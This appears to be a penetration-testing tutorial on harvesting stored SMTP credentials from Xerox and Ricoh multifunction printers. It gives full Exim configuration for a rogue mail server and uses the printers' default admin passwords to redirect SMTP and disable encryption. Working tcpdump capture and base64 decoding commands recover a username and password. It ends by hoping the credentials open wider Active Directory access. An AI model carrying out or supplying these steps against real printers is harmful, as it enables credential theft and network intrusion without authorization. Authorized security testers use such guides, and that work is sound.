
# Configure Your Mail Server

Any SMTP server will work. In this article I'll use Exim running on Ubuntu
18.04. First, install Exim with `apt-get install exim4`. Reconfigure with
`dpkg-reconfigure exim4-config`. Answer defaults to all questions except
"Split configuration into small files" - answer Yes here.

Insert the following exim4 configuration snippet to a new file at
/etc/exim4/conf.d/auth/20_authplain:

```
# enable plaintext authentication via AUTH PLAIN
plain_server:
  driver = plaintext
  public_name = PLAIN
  server_condition = "${if crypteq{$auth3}{${extract{1}{:}{${lookup{$auth2}lsearch{CONFDIR/passwd}{$value}{*:*}}}}}{1}{0}}"
  server_set_id = $auth2
  server_prompts = :
```

Edit /etc/exim4/conf.d/main/01_exim4-config_listmacrosdefs. Comment out the
following:

```
# listen on all all interfaces?
#.ifdef MAIN_LOCAL_INTERFACES
#local_interfaces = MAIN_LOCAL_INTERFACES
#.endif
```

Insert the following exim4 configuration snippet to a new file at
/etc/exim4/conf.d/main/10_listen_everywhere

```
local_interfaces=0.0.0.0
```

Regenerate the master configuration file and restart exim:

```
yourmailserver% update-exim4.conf
yourmailserver% systemctl restart exim4
```

Verify that authentication is enabled:

```
yourmailserver% nc -nv 127.0.0.1 25
Connection to 127.0.0.1 25 port [tcp/*] succeeded!
220 yourmailserver.xelphene.net ESMTP Exim 4.90_1 Ubuntu Fri, 16 Aug 2019 05:49:23 -0400
EHLO example.com
250-yourmailserver.xelphene.net Hello localhost [127.0.0.1]
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-AUTH PLAIN
250-CHUNKING
250-PRDR
250 HELP
```

If you see `250-AUTH PLAIN` after the EHLO, you're all set and ready to make
an MFD try to log in to your mail server.


# Configure a Xerox WorkCentre

First, browse to the device with your web browser and log in with the
default credentials, username "admin", password "1111". Go to the Properties
tab across the top and then Services -> E-mail -> Setup in the navigation
tree on the left.

Hit the "Edit..." link to the right of the SMTP setting. You'll end up
at the first page of SMTP settings. **Be sure to save everything you see
here**. After you're finished you'll need to revert these.

After you've saved the production settings somewhere, change the SMTP server
to the host name or IP address of your own mail server set up previously. 
Set it to use port 25.  Once you're finished, hit Save.

![Required Information Tab][required_info]

Next, head over to the Connection Encryption tab. **Skip the SMTP
Authentication tab. We don't want to lose what's already there.** Save the settings
on this tab to restore later. Set Connection Encryption to "No Encryption".
Hit Save.

![Connection Encryption Tab][connection_encryption]

You're ready have the device log in to your mail server. First, set up a
packet capture on your mail server to record the credentials:

```
yourmailserver% tcpdump -i ens160 -w pcap -n -s 1500 host 10.0.1.10 and port 25
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens160, link-type EN10MB (Ethernet), capture size 1500 bytes
```

The packet capture will be written to a file named `pcap`. `-s 1500` should
reflect the MTU of the interface you're capturing from. 1500 is typical for
Ethernet. `ip addr show` can be used to obtain the correct MTU.

With your packet capture set up, head back over to the WorkCentre's web interface. 
Proceed to the "Test Configuration" tab and do a test.  You can enter any
email address at all on the "To Address" field. You will probably get an
error message back.

Regardless, the WorkCentre tried to log in to our mail server with the
already-configured credentials and these should now be in our packet
capture.

Shut down the packet capture with ctrl-C:

```
yourmailserver% tcpdump -i ens160 -w pcap -n -s 1500 host 10.0.1.10 and port 25
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens160, link-type EN10MB (Ethernet), capture size 1500 bytes
^C0 packets captured
0 packets received by filter
0 packets dropped by kernel
```

Use `strings` to get non-binary content from the packet capture file. We
should be able to see the complete SMTP transaction:

```
yourmailserver% strings pcap
220 yourmailserver.xelphene.net ESMTP Exim 4.90_1 Ubuntu Thu, 15 Aug 2019 01:54:07 -0400
EHLO salesprinter.ad.xelphene.net
250-yourmailserver.xelphene.net Hello salesprinter.ad.xelphene.net [10.0.1.10]
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-AUTH PLAIN
250-CHUNKING
250-PRDR
250 HELP
AUTH PLAIN
334 
AHNhbGVzc2NhbmVyMgBtZmZ4OTg3IQ==
535 Incorrect authentication data
```

The line between `334` and `535 Incorrect authentication data` is what we're
looking for.  That's the base64-encoded credentials.  The username and
password are separated by a null.  Decode them with any base64 decoder and
parse by the nulls:

```
yourmailserver% base64 -d - | tr '\0' '\n'
AHNhbGVzc2NhbmVyMgBtZmZ4OTg3IQ==
^D

salesscaner2
mffx987!
yourmailserver% 
```

Voila - you now have some hopefully useful credentials.

Don't forget to clean up: back on the WorkCentre, restore the original
settings you saved at the Required Information tab and the Connection
Encryption tab.  Remember to hit Save after each tab.

With a little luck those are AD credentials and with a little more luck
they have access to more than just an SMTP relay ;).

[emailsetup]: emailsetup.png "E-mail Setup"
[required_info]: required_info.png "Required Information"
[connection_encryption]: connection_encryption.png "Connection Encryption"

# Configuring a Ricoh MP 306Z

The default administrator credentials are username "admin" with a blank
password.

After logging in and arriving at the home page, go to Device Management ->
Configuration.  SMTP settings can be found there at Device Settings ->
Email.

In the SMTP section, configure your mail server's hostname/IP address, port
25, and set SMTP Auth Encryption to Inactive. Be sure to save prior
settings.

For the life of me, I couldn't figure out how to make these things simply
send a test message on demand. You can set the device up to send
various notifications. From the Configuration page, hit Device Settings ->
Auto Email Notification. Add any email address to a Group in the "Groups to
Notify" section. In the "Select Groups/Items to Notify" check the box for as
many notifications as possible.

There's a notification for "Device Access Violation", but strangely this
doesn't do anything for failed adminstrative logins. As far as I can tell,
one must wait for one of these events to occur naturally.

If the device has any scanned documents available on it, you can ask it to
send one immediately. From the Home page, go to Print Job/Stored File ->
Document Server and look around.

